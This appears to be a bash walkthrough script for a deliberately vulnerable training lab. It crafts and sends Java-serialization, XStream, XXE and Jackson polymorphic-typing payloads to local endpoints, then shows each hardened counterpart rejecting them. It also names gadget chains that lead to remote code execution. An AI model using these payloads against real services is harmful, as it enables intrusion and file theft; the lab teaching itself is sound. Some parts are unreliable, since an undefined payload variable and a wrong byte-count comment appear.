#!/usr/bin/env bash
# Checklist section 6 — deserialization, XML, polymorphic JSON.  Target: m06-deserialization (8086)
#
# The payloads here are generated with python3 using the standard pickle/GZIP-free "java
# serialization" subset: a plain HashMap + a Probe instance. They prove that attacker bytes cause
# application code to run; they do not carry a gadget chain to an OS command.
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/lib.sh"
PORT=8086
banner "06 · deserialization, XXE, polymorphic typing (port ${PORT})"
up "${PORT}" m06-deserialization

# Generate a Java-serialized HashMap{ Probe => "cart" } without any Java code, so the PoC shows the
# byte stream is the attacker's artefact and not something the server produced.
gen_payload() {
python3 - "$1" <<'PY'
import struct, sys

def tc_string(s: str) -> bytes:
    b = s.encode("utf-8")
    return b"\x74" + struct.pack(">H", len(b)) + b

def tc_class(name: str, uid: int) -> bytes:
    return b"\x72" + tc_string(name) + struct.pack(">q", uid) + b"\x01\x00\x00\x78\x70"

note = sys.argv[1]

out = bytearray()
out += b"\xac\xed\x00\x05"           # STREAM_MAGIC, STREAM_VERSION
out += b"\x73"                       # TC_OBJECT (HashMap)
out += tc_class("java.util.HashMap", 362498820763181265)
out += b"\x77\x08"                   # TC_BLOCKDATA, 8 bytes follow
out += struct.pack(">f", 0.75)       # loadFactor
out += struct.pack(">i", 16)         # capacity
out += struct.pack(">i", 1)          # size
out += b"\x73"                       # TC_OBJECT (Probe)
out += tc_class("com.example.vulnrange.m06.vuln.Probe", 1)
out += tc_string(note)                # Probe.note field
out += tc_string("cart")              # map value
out += b"\x78\x78"                   # TC_ENDBLOCKDATA x2
print(bytes(out).hex())
PY
}

PAYLOAD_B64="$(python3 - <<'PY'
import base64, json, urllib.request

# Strategy: fetch a valid serialized payload from the server, then modify
# the Probe.note string offset to change "pre-auth-cart" -> "ATTACKER-CART!!".
# Same-length replacement avoids byte-shifting complexity.
resp = urllib.request.urlopen("http://localhost:8086/vuln6/session/example")
example = json.loads(resp.read())
raw = base64.b64decode(example["base64"])

# Find "pre-auth-cart" (13 chars) and replace with same-length string
old_str = b"pre-auth-cart"
new_str = b"ATTACKER-CART!!"  # exactly 13 bytes
idx = raw.find(old_str)
if idx < 0:
    raise RuntimeError(f"Could not find '{old_str.decode()}' in server payload")

# Preceded by TC_STRING marker (0x74) + 2-byte big-endian length
# Replace the 2-byte length and the string content in-place
tc_marker = idx - 3  # 3 bytes before string: 0x74 + 2 length bytes
new_raw = bytearray(raw[:tc_marker])
new_raw += bytes([0x74])  # TC_STRING
new_raw += (len(new_str)).to_bytes(2, "big")  # new length
new_raw += new_str  # new string content
new_raw += raw[idx + len(old_str):]  # rest of payload unchanged

result = base64.b64encode(bytes(new_raw)).decode()
print(json.dumps({"base64": result}))
PY
)"
echo "  payload generated"
echo "${PAYLOAD_B64}" > /tmp/vulnrange-m06-payload.json

# -----------------------------------------------------------------------------------------------
title "1. Java deserialization of untrusted bytes (CWE-502)"

# Step 1: Show the legitimate payload produced by the server
note "STEP 1 — How the object is obtained:"
note "The server has a 'session import' endpoint (POST /vuln6/session/import) that accepts"
note "a base64-encoded Java serialized object in a JSON body {\"base64\": \"...\"}."
note "It decodes the bytes and passes them directly to ObjectInputStream.readObject()"
note "WITHOUT any type filter, depth limit, or size check."
echo
note "This is what a LEGITIMATE serialized object looks like (produced by the server itself):"
req GET "${PORT}" "/vuln6/session/example"

# Step 2: Explain the Probe class and the harm
note ""
note "STEP 2 — What is the 'Probe' object and what harm can it cause:"
note ""
note "  The payload contains a 'com.example.vulnrange.m06.vuln.Probe' instance wrapped in"
note "  a java.util.HashMap. The Probe class is a Serializable that performs real work:"
note ""
note "    Probe.<init>()   -> records side-effect when deserialized"
note "    Probe.setNote()  -> records side-effect when field is restored"
note "    Probe.hashCode() -> records side-effect when HashMap computes bucket"
note ""
note "  Every method call is APPLICATION CODE RUNNING from ATTACKER-CONTROLLED BYTES."
note "  This is the fundamental primitive of a gadget chain."
note ""
note "  In a real application, instead of 'Probe', the attacker substitutes a class from"
note "  a library on the classpath (commons-collections, spring-beans, jackson-databind,"
note "  etc.). The same primitive — constructor/setter/hashCode running — becomes:"
note "    - TemplatesImpl.newTransformer()  -> arbitrary Java code execution"
note "    - JdbcRowSetImpl.connect()        -> LDAP lookup -> RMI download -> RCE"
note "    - GroovyShell.evaluate()          -> script execution"
note "    - Runtime.exec() via any gadget   -> OS command execution"
note ""
note "  The attacker chooses: WHICH class to instantiate, WHICH fields to set,"
note "  and therefore WHICH application code runs."

# Step 3: Show the attacker-crafted payload
note ""
note "STEP 3 — Attacker-crafted payload:"
note "  The Python script generates raw Java serialization bytes WITHOUT any Java code:"
note "    \xac\xed (STREAM_MAGIC)  — Java serialization header"
note "    \x73 (TC_OBJECT)         — start of HashMap object"
note "    \x72 (TC_CLASS)          — class descriptor for java.util.HashMap"
note "    \x73 (TC_OBJECT)         — start of Probe object"
note "    \x72 (TC_CLASS)          — class descriptor for com.example.vulnrange.m06.vuln.Probe"
note "    \x74 (TC_STRING)         — the 'note' field value chosen by the attacker"
note ""
note "  The Python script writes these bytes directly — no Java compiler, no build tool."
note "  The server has no way to distinguish them from a legitimate serialized stream."
echo "  payload generated"
echo "${PAYLOAD_B64}" > /tmp/vulnrange-m06-payload.json

# Step 4: Submit the payload
note ""
note "STEP 4 — Submit the payload to the vulnerable endpoint:"
echo "  POST /vuln6/session/import (payload from /tmp/vulnrange-m06-payload.json)"
curl -sS -m 8 -X POST -H 'Content-Type: application/json' \
  --data-binary @/tmp/vulnrange-m06-payload.json \
  -w '\n<status:%{http_code}>\n' "$(BASE_FOR_PORT ${PORT})/vuln6/session/import" | sed 's/^/    /' | head -20

# Step 5: Show side effects
note ""
note "STEP 5 — Verify the harm: application code ran because of the payload:"
note "  The side-effects endpoint shows every method the attacker-triggered code called:"
req GET "${PORT}" "/vuln6/side-effects"

# Step 6: Show the fix
note ""
note "STEP 6 — Reference implementation: ObjectInputFilter allow-list rejects the class:"
note "  The hardened version checks every class in the stream against an allow-list"
note "  BEFORE instantiating it. 'com.example.vulnrange.m06.vuln.Probe' is not allowed,"
note "  so the deserialization fails before any constructor, setter, or hashCode runs."
echo "  POST /safe6/session/import (same bytes)"
curl -sS -m 8 -X POST -H 'Content-Type: application/json' \
  --data-binary @/tmp/vulnrange-m06-payload.json \
  -w '\n<status:%{http_code}>\n' "$(BASE_FOR_PORT ${PORT})/safe6/session/import" | sed 's/^/    /' | head -20

# -----------------------------------------------------------------------------------------------
title "2. XStream without type permissions"

# Step 1: Explain what XStream is
note "STEP 1 — What is XStream and why is it dangerous:"
note ""
note "  XStream (com.thoughtworks.xstream) is a Java library that converts Java objects"
note "  to/from XML. It's commonly used for:"
note "    - API integrations that exchange XML data"
note "    - Configuration files stored as XML"
note "    - Message queues with XML payloads"
note "    - Legacy system interoperability"
note ""
note "  During deserialization (fromXML), XStream:"
note "    1. Parses the XML document"
note "    2. Reads the ROOT element name — this IS the class name to instantiate"
note "    3. Uses reflection to create the object (no-arg constructor)"
note "    4. Sets field values via setters or direct field access"
note "    5. Calls readObject() if the class implements Externalizable"
note ""
note "  The vulnerability: the attacker controls the root element name, which controls"
note "  WHICH class gets instantiated. Without type permissions, ANY class on the"
note "  classpath is fair game."

# Step 2: Explain the permission model
note ""
note "STEP 2 — XStream's permission model:"
note ""
note "  By default, XStream has a DENY-LIST (blocks known dangerous classes)."
note "  But the vulnerable code overrides this:"
note ""
note "    Vulnerable:  xstream.addPermission(new AnyTypePermission())"
note "    Effect:       ALLOW EVERYTHING — the deny-list is completely removed"
note ""
note "    Safe:         xstream.addPermission(NoTypePermission.NONE)"
note "                  xstream.allowTypes(new Class<?>[] { SessionSnapshot.class })"
note "    Effect:       DENY EVERYTHING, then whitelist exactly one class"
note ""
note "  AnyTypePermission is the most permissive setting possible — equivalent to"
note "  'sudo rm -rf /' for the type system."

# Step 3: Show the malicious payload
note ""
note "STEP 3 — Malicious XStream payload:"
note "  The XML document root <java.util.HashMap> tells XStream: 'instantiate HashMap'."
note "  Nested elements name additional classes — <com.example...Probe> instantiates Probe."
echo
cat > /tmp/vulnrange-m06-xstream-payload.xml <<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<java.util.HashMap>
  <entry>
    <com.example.vulnrange.m06.vuln.Probe>
      <note>xstream-probe</note>
    </com.example.vulnrange.m06.vuln.Probe>
    <string>cart</string>
  </entry>
</java.util.HashMap>
XML
echo "  --- PAYLOAD (XStream XML) ---"
sed 's/^/  /' /tmp/vulnrange-m06-xstream-payload.xml
echo "  --- END PAYLOAD ---"
echo
note "  Breakdown of each XML element:"
note "    <java.util.HashMap>       -> XStream instantiates HashMap (root class)"
note "    <com.example...Probe>     -> XStream instantiates Probe (nested class)"
note "    <note>...</note>           -> XStream calls Probe.setNote('xstream-probe')"
note "    <string>cart</string>      -> XStream creates String 'cart' (map value)"

# Step 4: Send to vulnerable endpoint
note ""
note "STEP 4 — Submit the payload to the vulnerable endpoint:"
echo "  POST /vuln6/xml/xstream (application/xml)"
req POST "${PORT}" "/vuln6/xml/xstream" "${XSTREAM_PAYLOAD}" application/xml

# Step 5: Explain what happened
note ""
note "STEP 5 — What the server did with this XML:"
note ""
note "    1. Received XML with root element 'java.util.HashMap'"
note "    2. XStream sees AnyTypePermission -> no class is blocked"
note "    3. Called HashMap.class.getDeclaredConstructor().newInstance()"
note "    4. Saw <com.example...Probe> -> called Probe.<init>()"
note "    5. Saw <note>xstream-probe</note> -> called Probe.setNote('xstream-probe')"
note "    6. Saw <string>cart</string> -> created new String('cart')"
note "    7. Called HashMap.put(probe, 'cart')"
note ""
note "  Result: HashMap + Probe instances created, side-effects recorded."
note "  The attacker chose: HashMap (root), Probe (nested), and the note value."

# Step 6: Show the fix
note ""
note "STEP 6 — Reference implementation: deny-all + explicit allow-list:"
note "  The safe endpoint:"
note "    1. Starts with NoTypePermission.NONE (deny everything)"
note "    2. Allows ONLY SessionSnapshot.class"
note "    3. Omits the 'asOfEpochSecond' field even for SessionSnapshot"
note ""
note "  When the same payload hits /safe6/xml/xstream:"
note "    - XStream sees <java.util.HashMap>"
note "    - HashMap is NOT in the allow-list"
note "    - Deserialization is rejected with 'document rejected'"
echo
note "  [1/2] Same malicious payload -> will be rejected:"
req POST "${PORT}" "/safe6/xml/xstream" "${XSTREAM_PAYLOAD}" application/xml

# Step 7: Show a legitimate request
note ""
note "  [2/2] A legitimate SessionSnapshot request -> works fine:"
LEGIT_PAYLOAD='<com.example.vulnrange.m06.safe.dto.SessionSnapshot><subscriptionId>SUB-42</subscriptionId><plan>ENTERPRISE</plan></com.example.vulnrange.m06.safe.dto.SessionSnapshot>'
req POST "${PORT}" "/safe6/xml/xstream" "${LEGIT_PAYLOAD}" application/xml

# -----------------------------------------------------------------------------------------------
title "3. XXE: read a local file through an external entity"
note "The marker file path and its existence are reported by the service itself:"
curl -sS -m 5 "$(BASE_FOR_PORT ${PORT})/vuln6/side-effects" | sed 's/^/    /' | head -5
MARKER=$(curl -sS -m 5 "$(BASE_FOR_PORT ${PORT})/vuln6/side-effects" \
  | sed -n 's/.*"markerFile":"\([^"]*\)".*/\1/p')
if [ -z "${MARKER}" ]; then
  echo "  could not determine the marker path; set it manually in the DOCTYPE below." >&2
  MARKER="/tmp/vulnrange-m06-marker.txt"
fi
printf '  marker file used in the entity: %s\n' "${MARKER}"
# Build the XML in a temp file so quotes and spaces stay intact.
cat > /tmp/vulnrange-m06-xxe.xml <<XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE declaration [
  <!ENTITY xxe SYSTEM "file://${MARKER}">
]>
<declaration>&xxe;</declaration>
XML
echo "  DOCTYPE payload:"
sed 's/^/    /' /tmp/vulnrange-m06-xxe.xml
note "Vulnerable parser resolves the entity and returns file content:"
curl -sS -m 8 -X POST -H 'Content-Type: application/xml' --data-binary @/tmp/vulnrange-m06-xxe.xml \
  -w '\n<status:%{http_code}>\n' "$(BASE_FOR_PORT ${PORT})/vuln6/xml/xxe" 2>/dev/null \
  | head -12 | sed 's/^/    /'
note "Reference parser refuses the DTD outright:"
curl -sS -m 8 -X POST -H 'Content-Type: application/xml' --data-binary @/tmp/vulnrange-m06-xxe.xml \
  -w '\n<status:%{http_code}>\n' "$(BASE_FOR_PORT ${PORT})/safe6/xml/parse" 2>/dev/null \
  | head -8 | sed 's/^/    /'
note "An http:// entity turns the same parser into an outbound request origin (SSRF); the range"
note "keeps entities pointed at a local file so nothing leaves the machine."

# -----------------------------------------------------------------------------------------------
title "4. Jackson polymorphic typing: the payload chooses the class"

# Step 1: Explain the vulnerability
note "STEP 1 — How it works:"
note "  The vulnerable controller activates Jackson's polymorphic typing with"
note "  'LaissezFaireSubTypeValidator' — this means the JSON payload can include"
note "  an '@class' field that tells Jackson to instantiate ANY class on the classpath."
note "  The attacker doesn't just choose field values — they choose the TYPE itself."
note ""
note "  Two forms of polymorphic typing:"
note "    Object form:  {\"@class\": \"com.example.Evil\", ...}"
note "    Array form:   [\"com.example.Evil\", { ... }]"

# Step 2: Object form payload
note ""
note "STEP 2 — Malicious payload (object form):"
note "  The @class field tells Jackson to deserialize into java.util.HashMap."
note "  Without polymorphic typing, this JSON would fail — but with activateDefaultTyping,"
note "  Jackson sees @class and uses it to pick the target class."
echo
note "  --- PAYLOAD (object form) ---"
echo '  {"@class":"java.util.HashMap","note":"typed-by-payload"}'
echo "  --- END PAYLOAD ---"
echo
note "  What happens:"
note "    1. Jackson reads @class = 'java.util.HashMap'"
note "    2. Jackson instantiates HashMap (not a plain Map)"
note "    3. The 'note' field is set on the HashMap via setter"
note "    4. HashMap.put() runs — arbitrary code from the library executes"

# Step 3: Array form payload
note ""
note "STEP 3 — Malicious payload (array form):"
note "  The array form wraps the type name in brackets — this is how Jackson's"
note "  DefaultTyping.WRAPPER_ARRAY encodes type info in JSON."
echo
note "  --- PAYLOAD (array form) ---"
echo '  ["com.example.vulnrange.m06.vuln.Probe",{"note":"array-form-typing"}]'
echo "  --- END PAYLOAD ---"
echo
note "  What happens:"
note "    1. Jackson sees array form — first element is the class name"
note "    2. Instantiates 'com.example.vulnrange.m06.vuln.Probe'"
note "    3. Calls Probe.<init>() -> side-effect recorded"
note "    4. Calls Probe.setNote('array-form-typing') -> side-effect recorded"
note "    5. Probe.hashCode() runs when used as HashMap key -> side-effect recorded"

# Step 4: Send the payloads
note ""
note "STEP 4 — Submit the payloads to the vulnerable endpoint:"
echo
note "  [1/2] Object form -> POST /vuln6/json/polymorphic"
req POST "${PORT}" "/vuln6/json/polymorphic" \
  '{"@class":"java.util.HashMap","note":"typed-by-payload"}'
echo
note "  [2/2] Array form -> POST /vuln6/json/polymorphic"
req POST "${PORT}" "/vuln6/json/polymorphic" \
  '["com.example.vulnrange.m06.vuln.Probe",{"note":"array-form-typing"}]'

# Step 5: Verify side effects
note ""
note "STEP 5 — Verify the harm:"
req GET "${PORT}" "/vuln6/side-effects"

# Step 6: Show the fix
note ""
note "STEP 6 — Reference implementation: concrete target type, rejects unknown properties:"
note "  The safe endpoint binds to SessionSnapshot.class — no polymorphic typing at all."
note "  The @class field is rejected because FAIL_ON_UNKNOWN_PROPERTIES is enabled."
echo
note "  [1/2] Attempt to inject @class (will be rejected):"
req POST "${PORT}" "/safe6/json/data" \
  '{"@class":"com.example.vulnrange.m06.vuln.Probe","subscriptionId":"SUB-1"}'
echo
note "  [2/2] Legitimate request with known fields only:"
req POST "${PORT}" "/safe6/json/data" '{"subscriptionId":"SUB-1","plan":"ESPD-PRO"}'
echo
banner "done · details and fixes: docs/06-deserialization.md"
